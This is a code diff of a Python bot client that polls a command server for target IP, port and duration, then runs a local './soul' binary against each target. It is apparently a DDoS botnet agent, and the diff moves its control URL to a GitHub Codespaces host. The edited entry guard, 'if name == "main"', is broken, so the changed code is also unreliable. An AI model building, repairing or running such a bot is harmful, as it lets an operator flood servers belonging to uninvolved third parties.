@@ -2,10 +2,9 @@ import requests
 import subprocess
 import time
 
-BASE_URL = 'http://72.60.67.207:3001'
-SOUL_PATH = '/ultrabhai/'
-DONE_PATH = '/ultrabhai/done'
-
+BASE_URL = 'https://fuzzy-meme-v677rwvx47p73ppr7-3001.app.github.dev/'
+ULTRA_PATH = '/example/'      # yahan same path rakho jo server.py mein hai
+DONE_PATH = '/example/done'
 
 active_tasks = {}
 
@@ -19,28 +18,21 @@ def process_new_task(added):
         if key not in active_tasks:
             print(f"[+] New task added: IP={ip}, Port={port}, Time={time_val}")
             try:
-                
                 process = subprocess.Popen(['./soul', ip, str(port), str(time_val), '900'])
                 print(f"[+] Launched binary: ./soul {ip} {port} {time_val} 900 (PID: {process.pid})")
-
-
             except Exception as e:
                 print(f"[!] Failed to launch binary: {e}")
-            active_tasks[key] = int(time_val) 
-        else:
-            
-            pass
+            active_tasks[key] = int(time_val)
     else:
         print("[!] Task received but missing ip, port, or time values")
 
 def main_loop():
     while True:
         try:
-            response = requests.get(f'{BASE_URL}{SOUL_PATH}')
+            response = requests.get(f'{BASE_URL}{ULTRA_PATH}')
             response.raise_for_status()
             data = response.json()
 
-            
             if isinstance(data, dict):
                 if data.get('success') and 'added' in data:
                     process_new_task(data['added'])
@@ -49,7 +41,6 @@ def main_loop():
                     if isinstance(item, dict) and item.get('success') and 'added' in item:
                         process_new_task(item['added'])
 
-            
             tasks_to_delete = []
             for key in list(active_tasks.keys()):
                 active_tasks[key] -= 1
@@ -67,11 +58,11 @@ def main_loop():
                         print(f"[!] Failed to send delete request: {e}")
                     tasks_to_delete.append(key)
 
-            
             for key in tasks_to_delete:
                 active_tasks.pop(key, None)
 
             time.sleep(1)
+
         except requests.RequestException as e:
             print(f"[!] Request error: {e}")
             time.sleep(1)
@@ -79,5 +70,5 @@ def main_loop():
             print(f"[!] General error: {e}")
             time.sleep(1)
 
-if __name__ == '__main__':
+if name == "main":
     main_loop()
